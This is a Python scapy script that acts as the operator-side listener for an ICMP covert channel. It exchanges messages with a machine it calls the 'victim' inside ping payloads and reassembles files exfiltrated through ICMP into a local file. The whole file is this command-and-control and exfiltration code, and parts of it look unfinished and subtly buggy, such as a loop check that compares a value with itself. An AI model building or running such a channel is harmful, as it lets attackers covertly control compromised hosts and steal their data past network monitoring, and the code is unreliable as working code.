import sys
import time
from scapy.all import *
from scapy.layers.all import IP, ICMP


def RequestHandler(pkt):
    payload = pkt[0].load.decode('utf-8')
    flag = payload[:1]

    if "hello" == payload[1:]:
        HelloHandler(pkt)
    elif flag == "1":
        PrintHandler(pkt, payload[1:])
    elif flag == "2":
        print("2")
        FileHandler(pkt, payload[1:])


def HelloHandler(pkt):
    print("---Start---")
    seq = 1
    msg = input("Msg to send: ")
    SendPacket(msg, pkt, seq)


def PrintHandler(pkt ,payload):
    # you initiate DATA handler and print it
    print("from victim: ", payload)
    time.sleep(1)
    SendPacket("ok", pkt, pkt[0].seq)


def FileHandler(pkt, payload):
    data = payload + DataHandler(pkt)
    # you initiate DATA handler and push what is returned to a file
    with open(f"./msg.txt", "a+") as my_file:
        my_file.write(data)


def DataHandler(pkt):
    # this function recieves data and should sniff
    # untill the whole data is sent meaning fin is sent
    # it should run in a loop to add to a buffer and at the end return the buffer
    seq = pkt[0].seq
    buffer = ""
    while True:
        data = pkt[0].load.decode('utf-8')
        seq = pkt[0].seq
        print(f"seq {seq} pkt_seq {pkt[0].seq}")
        if (data[:1] == "f" and seq == pkt[0].seq):
            break
        buffer += pkt[0].load.decode('utf-8')
        time.sleep(1)
        SendPacket("ok", pkt, pkt[0].seq)
        pkt = sniff(filter=f"icmp", count=1, timeout=3)
        print(list(pkt))
    return buffer


def SendPacket(msg, pkt, seq):
    print(pkt[0][IP].src)
    print(pkt[0][IP].dst)
    send(IP(dst=pkt[0][IP].src, src=pkt[0][IP].dst)/ICMP(type=0, seq=seq)/(f'{msg}'))


if __name__ == '__main__':
    try:
        while True:
            sniff(filter=f"icmp", prn=RequestHandler, count=1)
    except KeyboardInterrupt:
        print("bye bye")